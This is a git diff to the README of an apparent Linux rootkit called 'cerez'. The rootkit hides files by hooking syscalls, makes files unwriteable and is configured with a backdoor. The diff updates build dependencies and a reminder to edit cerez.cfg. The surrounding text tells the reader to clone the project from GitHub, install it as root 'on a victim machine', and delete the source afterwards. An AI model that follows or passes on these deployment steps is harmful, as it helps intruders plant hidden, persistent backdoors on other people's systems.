@@ -19,10 +19,13 @@ hidden. It does so by overwriting syscalls and functions like `open`, `unlinkat`
 - ✔ Makes files unwriteable 
 
 ## Install 
-### You will need to install `build-essential` to compile!
+> **Warning**
+> Don't forget to edit `cerez.cfg` before install 
+
+### You will need to install `build-essential` and `libconfig` to compile!
 You can install it with `apt` on debian systems:
 ```bash
-apt update && apt install build-essential
+apt update && apt install build-essential libconfig-dev
 ```
 To install the rootkit on a victim machine run the following
 as **ROOT**:
@@ -31,7 +34,6 @@ git clone https://github.com/ngn13/cerez.git && cd cerez
 make && make install
 cd .. && rm -rf cerez
 ```
-Don't forget to edit `cerez.cfg` before install!
 
 ## Config `(/etc/cerez.cfg)`
 Configuration is (really) simple, in the `backdoor` section,
